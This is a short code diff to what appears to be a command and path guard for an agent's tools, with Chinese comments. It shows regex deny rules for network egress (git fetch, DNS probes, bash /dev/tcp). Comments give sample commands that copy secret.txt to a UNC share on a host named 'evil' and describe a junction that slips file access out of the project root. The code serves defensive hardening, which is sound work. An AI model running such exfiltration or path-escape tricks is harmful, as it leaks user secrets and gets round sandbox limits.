@@ -175,7 +175,7 @@ const EGRESS_COMMAND_PATTERNS: Array<{ re: RegExp; label: string }> = [
   { re: /\bgit\b[^\n]*?\b(?:clone|fetch|ls-remote|pull)\b/i, label: 'git 远程读写' },
   { re: /\b(?:ping|nslookup|dig|host)\s+[a-z0-9-]+(?:\.[a-z0-9-]+)+\b/i, label: 'DNS/ICMP 探测' },
   { re: /\/dev\/tcp\/|\/dev\/udp\//, label: 'bash /dev/tcp' },
-  // SEC-A（2026-11-10，B-16 对抗套件实抓）：UNC 路径是**文件系统层的外发通道**——
+  // SEC-A（2026-11-10，对抗测试实抓）：UNC 路径是**文件系统层的外发通道**——
   // `cp secret.txt //evil/share/x`、`echo x > \\evil\share\x` 在词表里没有任何一条命中，
   // standard 档直接放行（实抓）。这里认「UNC 形态的路径」本身（`\\host\` 或 `//host/`）；
   // 前面不是 `:`（排除 http://、file:// 这类 URL——它们已由各自规则覆盖）。
@@ -375,7 +375,7 @@ function containedIn(child: string, root: string): boolean {
 }
 
 /**
- * SEC-B（2026-11-10，B-16 对抗套件实抓）：路径层此前只做**词法**包含判定——
+ * SEC-B（2026-11-10，对抗测试实抓）：路径层此前只做**词法**包含判定——
  * 项目根里放一个指向根外的 junction（`mklink /J`），`proj/link/secret.txt` 词法在根内、
  * 真实落在根外，读/写都会放行。这里对**存在的最近祖先**做 realpath 归一，把 junction/
  * symlink 展开后再比较；路径不存在时按词法（与旧行为一致），失败也回落词法（fail-safe 由
